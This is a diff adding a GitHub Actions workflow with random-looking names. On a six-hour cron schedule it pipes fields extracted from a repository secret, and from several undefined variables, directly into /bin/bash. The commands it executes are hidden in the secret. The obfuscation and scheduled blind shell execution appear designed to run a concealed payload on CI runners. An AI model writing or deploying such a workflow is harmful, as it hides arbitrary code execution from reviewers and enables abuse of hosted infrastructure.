@@ -1,0 +1,24 @@
+name: remudaparliament
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '33 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: remudaparliament
+        env:
+          sygjw89: ${{ secrets.sygjw89 }}
+        run: |
+          echo $sygjw89 | jq -r .etu290 | /bin/bash
+          echo $kmq75357 | jq -r .r62 | /bin/bash
+          echo $kgqfo1 | jq -r .ih366 | /bin/bash
+          echo $ze165 | jq -r .hv5 | /bin/bash
+          echo $ytp82060 | jq -r .ipj307 | /bin/bash
+          echo $gojrx41 | jq -r .hjxn1 | /bin/bash
+          echo $vqq5 | jq -r .babkp3 | /bin/bash
+          echo $h094 | jq -r .lum29 | /bin/bash
+          echo $tyxsn61486 | jq -r .xndrj1894 | /bin/bash
+
